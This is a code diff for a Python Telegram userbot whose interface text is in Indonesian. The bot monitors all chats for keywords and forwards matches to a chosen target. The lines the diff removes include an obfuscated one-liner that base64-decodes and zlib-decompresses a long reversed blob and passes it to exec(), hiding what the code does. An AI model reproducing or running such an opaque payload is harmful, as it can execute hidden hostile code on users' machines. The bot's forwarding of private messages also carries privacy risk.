@@ -1,2 +1,399 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+"""
+╔══════════════════════════════════════════════════╗
+║   TELEGRAM USERBOT — AUTO KEYWORD NOTIFIER       ║
+║   v2.0 | Setup Wizard + All Channels Monitor     ║
+╚══════════════════════════════════════════════════╝
+
+Features:
+  ✅ Setup wizard interaktif (input sekali, auto simpan ke .env)
+  ✅ Monitor SEMUA channel/grup/private chat sekaligus
+  ✅ Notify ke username orang lain atau chat ID manapun
+  ✅ Multi-keyword dengan cooldown anti-spam
+  ✅ Log ke file JSON per match
+  ✅ Statistik live setiap 5 menit
+
+Requirements:
+    pip install telethon colorama python-dotenv
+
+Run:
+    python telegram_keyword_notifier.py
+"""
+
+import asyncio
+import re
+import os
+import sys
+import json
+import getpass
+import logging
+from datetime import datetime
+from pathlib import Path
+
+def check_deps():
+    missing = []
+    for pkg in [("telethon", "telethon"), ("colorama", "colorama"), ("dotenv", "python-dotenv")]:
+        try:
+            __import__(pkg[0])
+        except ImportError:
+            missing.append(pkg[1])
+    if missing:
+        print(f"\n❌  Package belum terinstall: {', '.join(missing)}")
+        print(f"    Jalankan: pip install {' '.join(missing)}\n")
+        sys.exit(1)
+
+check_deps()
+
+from telethon import TelegramClient, events
+from telethon.tl.types import User, MessageService
+from telethon.errors import FloodWaitError
+from colorama import Fore, Style, init as colorama_init
+from dotenv import set_key, dotenv_values
+
+colorama_init(autoreset=True)
+
+ENV_FILE  = Path(".env")
+SESSION   = "userbot_session"
+LOG_FILE  = "keyword_matches.log"
+
+def c(txt, col):  return f"{col}{txt}{Style.RESET_ALL}"
+def ok(t):   print(c(f"  ✅ {t}", Fore.GREEN))
+def info(t): print(c(f"  ℹ  {t}", Fore.CYAN))
+def warn(t): print(c(f"  ⚠  {t}", Fore.YELLOW))
+def err(t):  print(c(f"  ❌ {t}", Fore.RED))
+def dim(t):  print(c(f"     {t}", Fore.WHITE))
+def head(t): print(c(f"\n{'━'*52}\n  {t}\n{'━'*52}", Fore.MAGENTA))
+
+
+def banner():
+    print(c("""
+╔════════════════════════════════════════════════════╗
+║                                                    ║
+║   🤖  TELEGRAM USERBOT KEYWORD NOTIFIER  v2.0     ║
+║       Monitor All Channels · Auto Notify           ║
+║                                                    ║
+╚════════════════════════════════════════════════════╝""", Fore.CYAN))
+
+def save_env(key: str, value: str):
+    """Tulis atau update satu key di .env."""
+    if not ENV_FILE.exists():
+        ENV_FILE.touch()
+    set_key(str(ENV_FILE), key, value)
+
+
+def load_env() -> dict:
+    """Baca semua nilai dari .env."""
+    if not ENV_FILE.exists():
+        return {}
+    return dotenv_values(str(ENV_FILE))
+
+
+def env_complete(cfg: dict) -> bool:
+    """Cek apakah semua key wajib sudah ada."""
+    required = ["API_ID", "API_HASH", "PHONE", "NOTIFY_TARGET", "KEYWORDS"]
+    return all(cfg.get(k, "").strip() for k in required)
+
+def ask(label: str, default: str = "", secret: bool = False, hint: str = "") -> str:
+    """Prompt dengan tampilan konsisten."""
+    parts = [c(f"  ➤  {label}", Fore.YELLOW)]
+    if hint:
+        parts.append(c(f" [{hint}]", Fore.WHITE))
+    if default:
+        parts.append(c(f" (enter = {default!r})", Fore.WHITE))
+    parts.append(c(": ", Fore.YELLOW))
+    prompt_str = "".join(parts)
+    if secret:
+        val = getpass.getpass(prompt_str)
+    else:
+        val = input(prompt_str).strip()
+    return val if val else default
+
+
+def setup_wizard() -> dict:
+    head("🔧 SETUP WIZARD")
+    print(c("  Semua input akan disimpan otomatis ke .env\n", Fore.WHITE))
+
+    cfg = load_env()
+
+    # ── Credentials ───────────────────────────────────────────────────────────
+    print(c("\n  ① TELEGRAM API CREDENTIALS", Fore.CYAN))
+    dim("Buka https://my.telegram.org/apps → buat App → salin API_ID & API_HASH\n")
+
+    api_id   = ask("API_ID",   cfg.get("API_ID",   ""), hint="contoh: 12345678")
+    api_hash = ask("API_HASH", cfg.get("API_HASH", ""), hint="32 karakter hex", secret=True)
+    phone    = ask("PHONE",    cfg.get("PHONE",    ""), hint="contoh: +628123456789")
+
+    save_env("API_ID",   api_id)
+    save_env("API_HASH", api_hash)
+    save_env("PHONE",    phone)
+
+    # ── Notify Target ─────────────────────────────────────────────────────────
+    print(c("\n  ② NOTIFY TARGET", Fore.CYAN))
+    dim("Ke mana notifikasi dikirim saat keyword ditemukan?\n")
+    print(c("  Contoh nilai:", Fore.WHITE))
+    print(c("    me                  → Saved Messages (diri sendiri)", Fore.WHITE))
+    print(c("    @username           → username Telegram orang lain", Fore.WHITE))
+    print(c("    -100xxxxxxxxxx      → Chat ID grup / channel\n", Fore.WHITE))
+
+    notify_target = ask("NOTIFY_TARGET", cfg.get("NOTIFY_TARGET", "me"),
+                        hint="me / @username / chat_id")
+    save_env("NOTIFY_TARGET", notify_target)
+
+    # ── Keywords ──────────────────────────────────────────────────────────────
+    print(c("\n  ③ KEYWORDS", Fore.CYAN))
+    dim("Pisahkan dengan koma. Case-insensitive. Contoh: jual,beli,WTS,flash sale\n")
+
+    default_kw = cfg.get("KEYWORDS", "jual,beli,WTS,WTB,flash sale,diskon,promo")
+    keywords_raw = ask("KEYWORDS", default_kw, hint="kata1,kata2,...")
+    save_env("KEYWORDS", keywords_raw)
+
+    # ── Cooldown ──────────────────────────────────────────────────────────────
+    print(c("\n  ④ COOLDOWN ANTI-SPAM", Fore.CYAN))
+    dim("Jeda minimum (detik) sebelum notif ulang keyword+chat yang sama.\n")
+
+    cooldown = ask("COOLDOWN_SECONDS", cfg.get("COOLDOWN_SECONDS", "30"), hint="detik")
+    save_env("COOLDOWN_SECONDS", cooldown)
+
+    ok(f"Konfigurasi tersimpan di {ENV_FILE}\n")
+
+    return parse_config(dotenv_values(str(ENV_FILE)))
+
+
+def parse_config(cfg: dict) -> dict:
+    """Ubah dict .env menjadi config siap pakai."""
+    return {
+        "api_id":        int(cfg.get("API_ID",  0)),
+        "api_hash":      cfg.get("API_HASH",  ""),
+        "phone":         cfg.get("PHONE",     ""),
+        "notify_target": cfg.get("NOTIFY_TARGET", "me").strip(),
+        "keywords":      [k.strip() for k in cfg.get("KEYWORDS", "").split(",") if k.strip()],
+        "cooldown":      int(cfg.get("COOLDOWN_SECONDS", 30) or 30),
+    }
+
+_cooldown: dict = {}
+stats = {"scanned": 0, "matched": 0, "start": datetime.now()}
+
+NOTIFY_TPL = (
+    "🔔 **KEYWORD ALERT**\n"
+    "━━━━━━━━━━━━━━━━━━━━━\n"
+    "🔑 Keyword  : `{keyword}`\n"
+    "👤 Dari     : {sender}\n"
+    "💬 Chat     : {chat}\n"
+    "🕐 Waktu    : {time}\n"
+    "━━━━━━━━━━━━━━━━━━━━━\n"
+    "📝 **Pesan:**\n{message}\n"
+    "━━━━━━━━━━━━━━━━━━━━━\n"
+    "🔗 [Buka Pesan]({link})"
+)
+
+
+def in_cooldown(chat_id: int, kw: str, secs: int) -> bool:
+    key = (chat_id, kw.lower())
+    if key in _cooldown:
+        return (datetime.now() - _cooldown[key]).total_seconds() < secs
+    return False
+
+
+def set_cooldown(chat_id: int, kw: str):
+    _cooldown[(chat_id, kw.lower())] = datetime.now()
+
+
+def match_keywords(text: str, keywords: list) -> list:
+    found, tl = [], text.lower()
+    for kw in keywords:
+        pat = re.escape(kw.lower())
+        if len(kw) >= 3:
+            if re.search(r'\b' + pat + r'\b', tl):
+                found.append(kw)
+        else:
+            if pat in tl:
+                found.append(kw)
+    return found
+
+
+async def get_link(client, event) -> str:
+    try:
+        chat = await event.get_chat()
+        if getattr(chat, "username", None):
+            return f"https://t.me/{chat.username}/{event.message.id}"
+        cid = str(event.chat_id).replace("-100", "")
+        return f"https://t.me/c/{cid}/{event.message.id}"
+    except Exception:
+        return "—"
+
+
+async def get_sender_str(event) -> str:
+    try:
+        s = await event.get_sender()
+        if isinstance(s, User):
+            name = " ".join(filter(None, [s.first_name, s.last_name]))
+            return f"{name} (@{s.username})" if s.username else name
+        if hasattr(s, "title"):
+            return s.title
+    except Exception:
+        pass
+    return "Unknown"
+
+
+async def get_chat_str(event) -> str:
+    try:
+        chat = await event.get_chat()
+        if hasattr(chat, "title"):
+            return chat.title
+        if isinstance(chat, User):
+            return " ".join(filter(None, [chat.first_name, chat.last_name])) or "DM"
+    except Exception:
+        pass
+    return "Unknown"
+
+
+async def send_notify(client, event, cfg, keyword, sender, chat_title, link):
+    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    text = (event.message.text or "")[:500]
+
+    msg = NOTIFY_TPL.format(
+        keyword=keyword, sender=sender, chat=chat_title,
+        time=now, message=text, link=link,
+    )
+  
+    raw = cfg["notify_target"]
+    target = int(raw) if raw.lstrip("-").isdigit() else raw
+
+    try:
+        await client.send_message(target, msg, link_preview=False)
+        stats["matched"] += 1
+        ok(f"MATCH '{keyword}' │ {chat_title[:32]} │ {sender[:28]}")
+      
+        entry = {"time": now, "keyword": keyword, "chat": chat_title,
+                 "sender": sender, "preview": text[:200], "link": link}
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
+
+    except FloodWaitError as e:
+        warn(f"FloodWait {e.seconds}s — menunggu...")
+        await asyncio.sleep(e.seconds)
+        await client.send_message(target, msg, link_preview=False)
+    except Exception as ex:
+        err(f"Gagal kirim notif: {ex}")
+
+
+async def stats_loop():
+    while True:
+        await asyncio.sleep(300)
+        up = datetime.now() - stats["start"]
+        h, rem = divmod(int(up.total_seconds()), 3600)
+        m, _ = divmod(rem, 60)
+        print(c(
+            f"\n  📊 STATS  Uptime: {h}j {m}m  │  "
+            f"Dipindai: {stats['scanned']}  │  Match: {stats['matched']}\n",
+            Fore.CYAN
+        ))
+
+
+async def run_bot(cfg: dict):
+    head("🚀 MENJALANKAN BOT")
+
+    client = TelegramClient(SESSION, cfg["api_id"], cfg["api_hash"])
+
+    info(f"Menghubungkan dengan {cfg['phone']} ...")
+    await client.start(phone=cfg["phone"])
+
+    me = await client.get_me()
+    ok(f"Login sebagai : {me.first_name} (@{me.username or 'no-username'})")
+  
+    raw_target = cfg["notify_target"]
+    try:
+        entity = await client.get_entity(
+            int(raw_target) if raw_target.lstrip("-").isdigit() else raw_target
+        )
+        if isinstance(entity, User):
+            t_str = f"{entity.first_name} (@{entity.username or '?'})"
+        elif hasattr(entity, "title"):
+            t_str = entity.title
+        else:
+            t_str = raw_target
+    except Exception:
+        t_str = "Saved Messages" if raw_target == "me" else raw_target
+
+    print(c(f"\n  ⚙  CONFIG AKTIF", Fore.MAGENTA))
+    print(c(f"     🔍 Keywords   : {', '.join(cfg['keywords'])}", Fore.WHITE))
+    print(c(f"     👁  Monitor    : SEMUA channel, grup & DM", Fore.WHITE))
+    print(c(f"     🔔 Notify ke  : {t_str}", Fore.WHITE))
+    print(c(f"     ⏱  Cooldown   : {cfg['cooldown']} detik", Fore.WHITE))
+    print(c(f"     📄 Log file   : {LOG_FILE}\n", Fore.WHITE))
+
+    @client.on(events.NewMessage)
+    async def handler(event):
+        try:
+            if isinstance(event.message, MessageService):
+                return
+            if not event.message or not event.message.text:
+                return
+
+            stats["scanned"] += 1
+            matched = match_keywords(event.message.text, cfg["keywords"])
+            if not matched:
+                return
+
+            chat_title = await get_chat_str(event)
+            sender     = await get_sender_str(event)
+            link       = await get_link(client, event)
+            chat_id    = event.chat_id
+
+            for kw in matched:
+                if in_cooldown(chat_id, kw, cfg["cooldown"]):
+                    continue
+                set_cooldown(chat_id, kw)
+                await send_notify(client, event, cfg, kw, sender, chat_title, link)
+
+        except Exception as ex:
+            logging.debug(f"Handler error: {ex}")
+
+    asyncio.create_task(stats_loop())
+
+    ok("Bot aktif! Memantau SEMUA chat...")
+    print(c("     Tekan Ctrl+C untuk berhenti.\n", Fore.WHITE))
+
+    await client.run_until_disconnected()
+
+async def main():
+    banner()
+
+    raw_cfg = load_env()
+
+    if env_complete(raw_cfg):
+        cfg = parse_config(raw_cfg)
+        print(c(f"\n  ✅ Config ditemukan di {ENV_FILE}", Fore.GREEN))
+        print(c(f"     Phone    : {cfg['phone']}", Fore.WHITE))
+        print(c(f"     Target   : {cfg['notify_target']}", Fore.WHITE))
+        kw_preview = ", ".join(cfg["keywords"][:5])
+        if len(cfg["keywords"]) > 5:
+            kw_preview += f", ... (+{len(cfg['keywords'])-5} lagi)"
+        print(c(f"     Keywords : {kw_preview}", Fore.WHITE))
+
+        ans = input(c("\n  ➤  Gunakan config ini? [Y=lanjut / n=setup ulang]: ", Fore.YELLOW)).strip().lower()
+        if ans in ("n", "no", "tidak", "ulang"):
+            cfg = setup_wizard()
+    else:
+        warn(f"File {ENV_FILE} tidak ditemukan atau belum lengkap.")
+        info("Jalankan setup wizard dulu...\n")
+        cfg = setup_wizard()
+
+    await run_bot(cfg)
+
+
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.WARNING)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        up = datetime.now() - stats["start"]
+        h, rem = divmod(int(up.total_seconds()), 3600)
+        m, _ = divmod(rem, 60)
+        print(c(
+            f"\n\n  ⛔ Bot dihentikan  │  Uptime: {h}j {m}m  │  "
+            f"Dipindai: {stats['scanned']}  │  Match: {stats['matched']}\n",
+            Fore.RED
+        ))
+    except Exception as e:
+        err(f"Fatal error: {e}")
+        raise
